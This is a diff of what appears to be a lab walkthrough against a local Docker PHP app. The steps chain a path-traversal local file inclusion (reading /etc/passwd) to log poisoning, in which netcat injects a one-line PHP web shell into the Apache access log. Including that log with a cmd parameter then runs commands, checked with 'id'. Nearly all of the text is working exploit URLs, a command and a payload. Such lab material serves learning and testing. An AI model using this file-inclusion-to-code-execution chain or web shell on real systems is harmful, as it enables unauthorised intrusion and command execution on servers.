@@ -15,8 +15,12 @@ http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd
 - Get "access.log", changed here to "access_combined.log" because stdout is going out of docker:
 
 http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log
+
+```
 nc -nv 127.0.0.1 8883
 <?php echo shell_exec($_GET['cmd']);?>
+```
+
 http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&cmd=id
 
 -- Check for uid in output
